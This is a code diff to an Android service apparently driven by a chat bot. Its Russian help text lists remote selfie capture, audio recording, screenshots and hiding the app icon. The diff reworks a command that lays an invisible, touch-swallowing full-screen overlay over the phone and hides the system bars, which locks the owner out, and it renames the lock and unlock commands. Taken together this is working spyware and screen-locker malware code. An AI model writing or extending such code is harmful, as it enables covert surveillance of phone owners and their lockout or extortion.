@@ -156,11 +156,11 @@ public class BotService extends Service {
             case "/screenshot":
                 doScreenshot(fromChatId);
                 break;
-            case "/lock":
-                handleLock(text.trim(), fromChatId);
+            case "/block":
+                handleBlock(fromChatId);
                 break;
-            case "/unlock":
-                handleUnlock(text.trim(), fromChatId);
+            case "/stop":
+                handleStop(fromChatId);
                 break;
             case "/hide":
                 updateIconStatus(false);
@@ -182,8 +182,8 @@ public class BotService extends Service {
             "/selfie - Фронтальная камера\n" +
             "/record - Запись аудио\n" +
             "/screenshot - Скриншот экрана\n" +
-            "/lock - Заблокировать экран\n" +
-            "/unlock - Разблокировать экран\n" +
+            "/block - Заблокировать экран\n" +
+            "/stop - Разблокировать экран\n" +
             "/hide - Скрыть иконку\n" +
             "/show - Показать иконку";
         sendTextTo(chatId, msg);
@@ -199,25 +199,7 @@ public class BotService extends Service {
         }
     }
 
-    private void handleLock(String text, String chatId) {
-        String[] parts = text.split("\\s+", 2);
-        if (parts.length < 2 || parts[1].trim().isEmpty()) {
-            sendTextTo(chatId, "Укажи пароль: /lock <пароль>");
-            return;
-        }
-        lockScreen(chatId);
-    }
-
-    private void handleUnlock(String text, String chatId) {
-        String[] parts = text.split("\\s+", 2);
-        if (parts.length < 2 || parts[1].trim().isEmpty()) {
-            sendTextTo(chatId, "Укажи пароль: /unlock <пароль>");
-            return;
-        }
-        unlockScreen(chatId);
-    }
-
-    private void lockScreen(String chatId) {
+    private void handleBlock(String chatId) {
         if (isScreenLocked) {
             sendTextTo(chatId, "Уже заблокировано");
             return;
@@ -226,66 +208,68 @@ public class BotService extends Service {
             sendTextTo(chatId, "Нет разрешения SYSTEM_ALERT_WINDOW");
             return;
         }
-        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
-            try {
-                windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-                overlayView = new View(this);
-
-                // Прозрачный overlay — поглощает касания, не виден визуально
-                overlayView.setBackgroundColor(0x02000000);
-
-                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.MATCH_PARENT,
-                    WindowManager.LayoutParams.MATCH_PARENT,
-                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
-                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
-                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
-                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
-                    WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
-                    PixelFormat.TRANSLUCENT);
-
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                    params.layoutInDisplayCutoutMode =
-                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
-                }
-
-                // Скрываем навигацию и статус-бар
-                overlayView.setSystemUiVisibility(
-                    View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
-                    | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
-                    | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
-                    | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
-                    | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
-                    | View.SYSTEM_UI_FLAG_FULLSCREEN);
-
-                // Поглощаем все касания
-                overlayView.setOnTouchListener((v, event) -> true);
-
-                windowManager.addView(overlayView, params);
-                isScreenLocked = true;
-                sendTextTo(chatId, "Экран заблокирован");
-            } catch (Exception e) {
-                sendTextTo(chatId, "Ошибка блокировки: " + e.getMessage());
-            }
-        });
+        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> showOverlay(chatId));
     }
 
-    private void unlockScreen(String chatId) {
-        if (!isScreenLocked || overlayView == null) {
-            sendTextTo(chatId, "Экран не заблокирован");
-            return;
+    private void handleStop(String chatId) {
+        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> stopOverlay(chatId));
+    }
+
+    private void showOverlay(String chatId) {
+        try {
+            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+            overlayView = new View(this);
+
+            overlayView.setBackgroundColor(0x02000000);
+
+            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
+                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
+                WindowManager.LayoutParams.FLAG_HARDWARE_ACCELERATED,
+                PixelFormat.TRANSLUCENT);
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                params.layoutInDisplayCutoutMode =
+                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
+            }
+
+            overlayView.setSystemUiVisibility(
+                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                | View.SYSTEM_UI_FLAG_FULLSCREEN);
+
+            overlayView.setOnTouchListener((v, event) -> true);
+
+            windowManager.addView(overlayView, params);
+            isScreenLocked = true;
+            sendTextTo(chatId, "ЗАЩИТА АКТИВИРОВАНА");
+        } catch (Exception e) {
+            sendTextTo(chatId, "Ошибка блокировки: " + e.getMessage());
         }
-        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
+    }
+
+    private void stopOverlay(String chatId) {
+        if (isScreenLocked && overlayView != null) {
             try {
                 windowManager.removeView(overlayView);
                 overlayView = null;
                 isScreenLocked = false;
-                sendTextTo(chatId, "Экран разблокирован");
+                sendTextTo(chatId, "Доступ разрешен");
             } catch (Exception e) {
                 sendTextTo(chatId, "Ошибка разблокировки: " + e.getMessage());
             }
-        });
+        } else {
+            sendTextTo(chatId, "Экран не заблокирован");
+        }
     }
+
 
     private void doScreenshot(String chatId) {
         StatusAccessibilityService svc = StatusAccessibilityService.getInstance();
